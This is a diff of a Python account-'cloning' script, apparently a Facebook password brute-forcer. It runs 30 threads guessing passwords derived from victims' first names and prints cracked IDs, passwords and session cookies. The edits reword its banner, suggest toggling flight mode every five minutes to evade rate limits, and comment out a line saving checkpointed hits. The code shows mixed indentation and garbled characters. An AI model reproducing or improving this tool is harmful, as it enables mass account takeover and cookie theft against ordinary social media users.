@@ -414,16 +414,13 @@ def setting():
 	exit()
  
 def passwrd():
-    os.system('clear')
-    print(logo)
-    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
-    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[10;93mTODAY'S DATE :\033[1;92m "+date)
-    print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mYOUR TOTAL IDz \033[0;97m:\033[1;92m ',str(len(id)))
-    print("\033[97;1m[\033[92;1m•\033[97;1m] \x1b[38;5;208mSTARTED YOUR CLONING TIME\033[0;97m :> \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
-    print("\033[97;1m[\033[92;1m+\033[97;1m] \033[10;95mCLONING SPEED SUPER FAST-!✅")
-    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mUse Flight Mode For Speed Up ')
-    print('\033[0;97m===============================================')
-     with tred(max_workers=30) as pool:
+	os.system('clear')
+	banner()
+	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTOTAL IDz :\033[0;97m '+str(len(id)))
+	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;95mCloning Speed Super Fast")
+	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
+	SHANTOj(f'\033[0;97m===============================================')
+	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
@@ -500,7 +497,7 @@ def crack(idf,pwv):
 				#SHANTO-King
 				print(f'\r\033[0;94m[{time.strftime("%H:%M")}â€¢SHANTO-Cp] {idf} â€¢ {pw}\n\033[0;93[ðŸ¤Ÿ]= COOKIESâ€¢ \033[0;92m{kuki} ')     
 				os.system('espeak -a 300 " C,  P"')
-			    open('CP/'+cpc,'a').write(idf+' | '+pw+'\n')
+			    #open('CP/'+cpc,'a').write(idf+' | '+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
